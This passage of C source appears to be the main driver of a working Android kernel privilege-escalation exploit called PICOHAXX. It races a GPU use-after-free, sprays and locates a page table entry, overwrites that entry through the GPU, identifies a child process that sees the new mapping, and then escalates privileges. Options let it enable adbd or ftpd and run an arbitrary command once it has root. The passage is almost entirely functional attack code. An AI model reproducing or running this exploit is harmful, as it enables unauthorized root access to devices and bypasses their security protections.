                    last_index = i;
                }
            }

            // look for pte with exactly 1 entry, ending in 0x...3 or  0x...F (PTE Valid bits)
            if (non_zero_count == 1) {
                uint64_t candidate = page[last_index];
                if ((candidate & 3) == 3) {
                    ifdbg log64n(page[0], "the pte");
                    char buf[256];
                    sprintf(buf, "[!] TARGET PTE IDENTIFIED (scanned: %d)", pages_scanned);
                    diff_no_update(buf);

                    log2("[*] UAF GPU VA: 0x%016lx", va + (p * PAGE_SIZE));
                    log2("[*] Entry Index: %d (Offset 0x%x)", last_index, last_index * 8);
                    log2("[*] PTE: 0x%016lx", candidate);

                    g_found_pte.original_pte = candidate;
                    g_found_pte.gpu_va_page = va + (p * PAGE_SIZE);
                    g_found_pte.entry_index = last_index;
                    g_found_pte.gpu_va_pte = g_found_pte.gpu_va_page + (g_found_pte.entry_index * 8);

                    uint64_t target_pte_va = g_found_pte.gpu_va_pte;
                    uint64_t newpte=candidate + 0x10000;

                    if (gpu_write64(target_pte_va, newpte) != 0) {
                        log2("[-] Failed to overwrite PTE via GPU!");
                        goto abort;
                    }
                    if (gpu_read(target_pte_va, (uint32_t*)page, 1024) != 0) {
                        log2("[-] gpu_read failed");
                        goto abort;
                    }

                    ifdbg log64n(page[0], "new pte");
                    // diff_no_update("[*] Triggering Child Identification...");
                    log2("[*] Triggering Child Identification...");
                    
                    for (int i = 0; i < num_sprayers; i++) {
                        spray_ctrl[i].do_action = CMD_IDENTFY;
                    }
                    n=0;
                    while(1) {
                        if (spray_ctrl[num_sprayers].do_action != -1) {
                            g_chosen_idx = spray_ctrl[num_sprayers].do_action;
                            break;
                        }
                        if(n++ % 5 == 0) log2("... %d childs remain", spray_ctrl[num_sprayers].numchilds);
                        // timeout
                        if (n > 100) break;
                        sleepms(100);
                    }
                    if (g_chosen_idx == -1) {
                        log2("[-] No child could see the change. TLB?");
                        goto abort;
                    }

                    g_chosen_pid = spray_ctrl[g_chosen_idx].pid;

                    log2("[!!] CHILD %d with pid %d FOUND mapping change at VA 0x%lx base: 0x%lx",
                        g_chosen_idx, g_chosen_pid,
                        (uintptr_t) spray_ctrl[g_chosen_idx].pte_mapping, (uintptr_t) spray_ctrl[g_chosen_idx].base);
                    
                    kill_all_childs(g_chosen_pid);
                    ret = escalate_privs();
                    goto end;
                }
            }
        }
    }

    log2("\n[-] No PTE found. Huh?");

abort:  
    ret=-1;     // failed, may retry
    goto end;

fatal:
    ret=-2;     // fatal, no retries
    goto end;
ok:
    ret=0;
    goto end;
end:    
    if(g_dbgchild) show_child_timings();
    free(buffer);
    return ret;
}

void show_child_timings()
{
    #define pTS_DIFF_NS(ts2, ts1) (double) ((long long)(ts1->tv_sec  - ts2->tv_sec)  * 1000000000LL) + ((long long)(ts1->tv_nsec - ts2->tv_nsec)) / 1000000.f

    #define ts2ns(ts) ((long long)((ts->tv_sec % 1000) * 1000000000LL) + (long long)(ts->tv_nsec))
    #define ns2ms(ns) ((double) ((double) ns / 1000000.f))
    #define ts2ms(ts) ns2ms(ts2ns(ts))
    
    #define msdiff(a,b) (((a == 0.0)||(b == 0.0)) ? 0.f : (b-a))
        
    for (int i = 0; i < num_sprayers; i++) {
        struct timespec *start = &spray_ctrl[i].t[0];
        struct timespec *ready = &spray_ctrl[i].t[1];
        struct timespec *exit = &spray_ctrl[i].t[2];
        struct timespec *kill = &spray_ctrl[i].t[3];
        
        if(i == g_chosen_idx)  log2n(col(5) col(32));

        log2n("[%02d] %05d/%d(%d) |", i, spray_ctrl[i].scanned, spray_ctrl[i].mappings, such_spray);

        for (int t = 0; t < 4; t++) {
            struct timespec *ts=&spray_ctrl[i].t[t];
            log2n("%010.3f|", ts2ms(ts));
        }
        log2n("\n");
        for (int t = 0; t < 3; t++) {
            struct timespec *ts1=&spray_ctrl[i].t[t];
            struct timespec *ts2=&spray_ctrl[i+1].t[t];
            log2n("%010.3f|", msdiff(ts2ms(ts1), ts2ms(ts2)));
        }

        // log2n("  - %.3f ms / %.3f ms / %.3f ms", pTS_DIFF_NS(start,ready),pTS_DIFF_NS(ready,exit),pTS_DIFF_NS(ready,kill));
        if(spray_ctrl[i].exitMessage[0]) log2n(" - %s", spray_ctrl[i].exitMessage);
        if(i == g_chosen_idx) log2n(col(0));

    }
}


// failing to restore the pte, may trip the kernel later
void Restore_PTE()
{
    if(g_found_pte.original_pte == 0) {
        log2("Restore_PTE: theres nothing to restore yet.");
        return;
    }

    log2(blue("restoring original PTE: %016lx at %016lx"),  g_found_pte.original_pte,  g_found_pte.gpu_va_pte);

    if (gpu_write64(g_found_pte.gpu_va_pte, g_found_pte.original_pte) != 0) {
        log2("[-] Failed to restore PTE!!");
        return;
    }

    pseudo_flushTLB();
}

int check_switch(char *szSwitch, char *szArg)
{
    while (*szArg == '-' || *szArg == '/') szArg++;
    return *szArg && strcmp(szArg, szSwitch) == 0;
}

int handle_args(int nArgs, char **szArgs)
{
    #define cfg_switch(name)                            \
        else if (check_switch(#name, szArgs[i])) {      \
            g_##name = 1;                               \
        }
    #define cfg_bool(name)                              \
        else if (check_switch(#name, szArgs[i])) {      \
            g_##name = 1;                               \
        }                                               \
        else if (check_switch("no" #name, szArgs[i])) { \
            g_##name = 0;                               \
        }

    if(g_dbg2) if(g_dbg<2) g_dbg++;

    for (int i = 1; i < nArgs; i++) {
        if (check_switch("help", szArgs[i]) || check_switch("h", szArgs[i])) {
            print_usage(szArgs[0]);
            return 0;
        }

        cfg_bool(adbd) 
        cfg_bool(ftpd) 
        cfg_bool(sound)
        cfg_switch(unroot) 
        cfg_switch(force)
        cfg_switch(dbgchild)

        else if (check_switch("dbg", szArgs[i])) {
            if(g_dbg<2) g_dbg++;
        }        
        // dump memory right after the pte spray
        else if (check_switch("dump", szArgs[i])) {
            do_memdump = 256*1024*1024/4096;
        }
        else if (check_switch("v", szArgs[i])) {
            printf("%s\n",__TIMESTAMP__);
            uint64_t o=find_selinux_offset_for_firmware();
            log2("root: %d\ngetenforce: %d\nseOffset: 0x%lx", isRoot(), getenforce(), o);
            return 0;
        }
        // test terminal input
        else if (check_switch("ttest", szArgs[i])) {
            test_input();
            return 0;
        }
        // simulated dry run of final stage
        else if (check_switch("sim", szArgs[i])) {
            simulate();
            escalate_privs();
            return 0;
        }
        // stress test: do extra laps on the task walk!
        else if (check_switch("marathon", szArgs[i])) {
            g_marathon++;
        }
        // provide a custom command to finally execve to ( everything after "--" )
        else if (strcmp(szArgs[i], "--") == 0) {
            if (i + 1 >= nArgs) {
                fprintf(stderr, "usage: %s args -- /path/to/command args ]\n", szArgs[0]);
                return 0;
            }
            g_custom_spawn_args = &szArgs[i + 1];
        }
        else if (check_switch("cfg", szArgs[i])) {
            g_cfg=1;
        }
    }

    // continue
    return 1;
}

int hasInstance()
{
    if(system("pidof PICOHAXX") == 0)   return 1;
    if(system("pidof " FINALCOMM) == 0) return 1;
    return 0;
}

static int key_is_down(int fd, unsigned short code)
{
    unsigned char keystate[(KEY_MAX + 7) / 8];
    memset(keystate, 0, sizeof(keystate));

    if (ioctl(fd, EVIOCGKEY(sizeof(keystate)), keystate) < 0)
        return -1;

    return (keystate[code / 8] >> (code % 8)) & 1;
}

int get_vol_minus()
{
    return !system("getevent -i /dev/input/event1|grep '\\*'");
    int fd, down;

    fd = open("/dev/input/event1", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    down = key_is_down(fd, KEY_VOLUMEDOWN);
    printf("VOLDOWN %s\n", down == 1 ? "held" : down == 0 ? "released" : "ioctl failed");
    close(fd);
    return down;
}

void banner()
{
    char line[256];
    sprintf(line, cb("[PICOHAXX]") magenta2(" %s ") cr(" ♥ ") "%s", getVer(), rainbow("2026 by typlo"));
    log2n("%s", boxit(line,0));
}

int main(int nArgs, char **szArgs, char *envp[])
{
    diff("start");
    cfg_apply();

    // disable line buffer
    setvbuf(stderr, NULL, _IONBF, 0);
    banner();

    if(hasInstance()) {
        log2("hasInstance!");
        return 0;
    }
    
    prctl(PR_SET_NAME, MYTAG, 0, 0, 0);
    gsharedbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (gsharedbuf == MAP_FAILED) { perror("mmap"); exit(1); }
    spray_ctrl = mmap(NULL, sizeof(spray_slot_t) * (num_sprayers + 1), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (spray_ctrl == MAP_FAILED) { perror("mmap spray_ctrl"); exit(1); }
    memset(spray_ctrl, 0, sizeof(spray_slot_t) * (num_sprayers + 1));

    int ret=handle_args(nArgs, szArgs);
    if(g_cfg) {
        cfg_print();
    }    
    if(ret == 0) goto last_cleanup;
    log2("pid  = %d\nppid = %d", getpid(), getppid());
    
    if((isRoot()&& getenforce()==0) && !g_force) {
        log2(green("[+] Oh, your're already root? Another job well done! Anything else i can get you?"));
        log2("root: %d enforce: %d",isRoot(),getenforce());
        postExploit(0);
        goto last_cleanup;
    }

    int main_retries = 5;
    int exploit_success = 0;

    while(main_retries-- > 0) {
        PLAY_SOUND_BG(start);
        diff("restart");
        int uaf_retries = 10; // 10 tries to win the race
        int uaf_success = 0;

        while(uaf_retries-- > 0) {
            if (generate_uaf_range() == 0) {
                uaf_success = 1;
                break;
            }
            log2("[-] Retrying UAF generation... (%d attempts left)", uaf_retries);
            cleanup_uaf();
            sleep(1);
        }

        if (!uaf_success) {
            log2("[!] UAF generation  failed.");
            continue;
        }

        diff_no_update("UAF region created");

        // 2. Spraying
        STAGE_2_PTE_Spray();

        if (do_memdump) {
            dump_gpumem(UAF_START, 1024*4*do_memdump, 1024*64, "/sdcard/zmemdump");
            do_memdump = 0;
            goto last_cleanup;
        } 

        // 3. Scan & Execution
        int exec_res = STAGES_3to5_FIND_EXPLOIT_EXEC();
        if (exec_res == 0) {
            log2(green("[+] SUCCESS."));
            exploit_success = 1;
            break;
        } else if (exec_res == -2) {
            // fatal error
            log2(red("[!] Privilege escalation failed. Aborting all retries."));
            PLAY_SOUND_BG(fail);
            break;
        }
        else {
            log2(red("[-] PTE_Spray failed: ((%dfull retries left)"),main_retries);
            kill_all_childs(-1);
            cleanup_uaf();
            memset(spray_ctrl, 0, sizeof(spray_slot_t) * (num_sprayers + 1));
        }
    }

    if (!exploit_success) {
        log2(red("[!] All retries failed. Giving up."));
    }

last_cleanup:
    kill_all_childs(-1);
    cleanup_uaf();
    return exploit_success ? 0 : 1;
}
